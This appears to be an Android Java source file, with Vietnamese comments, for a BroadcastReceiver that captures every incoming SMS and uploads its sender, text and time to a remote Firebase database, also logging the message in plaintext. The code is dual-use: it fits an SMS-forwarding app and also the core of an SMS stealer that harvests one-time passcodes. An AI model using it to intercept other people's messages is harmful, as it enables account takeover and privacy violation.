package com.example.models;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;

public class SMSReceiver extends BroadcastReceiver {
    private static final String TAG = "SMSReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = smsMessage.getDisplayOriginatingAddress();
                    String message = smsMessage.getMessageBody();
                    long timestamp = smsMessage.getTimestampMillis();

                    // Đẩy tin nhắn lên Firebase
                    pushSmsToFirebase(sender, message, timestamp);
                }
            }
        }
    }

    private void pushSmsToFirebase(String sender, String message, long timestamp) {
        try {
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            DatabaseReference smsRef = database.getReference("sms_messages");

            // Tạo key tự động
            String key = smsRef.push().getKey();

            // Định dạng thời gian
            SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.getDefault());
            String time = sdf.format(new Date(timestamp));

            // Tạo dữ liệu tin nhắn
            HashMap<String, Object> smsData = new HashMap<>();
            smsData.put("sender", sender);
            smsData.put("message", message);
            smsData.put("timestamp", timestamp);
            smsData.put("time", time);

            // Lưu lên Firebase
            if (key != null) {
                smsRef.child(key).setValue(smsData);
                Log.d(TAG, "SMS pushed to Firebase: " + sender + " - " + message);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error pushing SMS to Firebase: " + e.getMessage());
        }
    }
}
